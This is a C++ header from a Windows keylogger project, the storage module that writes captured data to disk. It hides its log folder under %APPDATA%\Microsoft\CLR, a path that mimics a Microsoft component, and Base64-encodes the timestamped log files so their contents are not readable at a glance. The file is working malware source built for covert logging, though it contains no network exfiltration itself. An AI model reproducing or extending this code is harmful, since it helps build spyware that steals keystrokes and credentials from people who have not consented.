//
// Created by Samuel on 18/06/2017.
//

#ifndef KEYLOGGER_IO_H
#define KEYLOGGER_IO_H

#include <string>
#include <cstdlib>
#include <fstream>
#include "windows.h"
#include "Helper.h"
#include "Base64.h"

using namespace std;

namespace IO
{
	string GetOurPath(const bool append_seperator = false)
	{
		string appdata_dir(getenv("APPDATA"));
		string full = appdata_dir + "\\Microsoft\\CLR";
		return full + (append_seperator ? "\\" : "");
	}

	bool MkOneDR(string path)
	{
		return (bool)CreateDirectoryA(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
	}

	bool MKDir(string path)
	{
		for (char &c : path)
			if (c == '\\')
			{
				c = '\0';
				if (!MkOneDR(path))
					return false;
				c = '\\';
			}

		return true;
	}

	template <class T>
	string WriteLog(const T &t)
	{
		string path = GetOurPath(true);
		Helper::DateTime dt;
		string name = dt.GetTimeString("_") + ".log";

		try
		{
			ofstream file(path + name);
			if (!file) return "";
			ostringstream s;
			s << "[" << dt.GetTimeString() << "]" << endl << t << endl;
			string data = Base64::EncryptB64(s.str());
			file << data;
			if (!file)
				return "";
			file.close();
			return name;
		}
		catch (...)
		{
			return "";
		}
	}
}

#endif //KEYLOGGER_IO_H

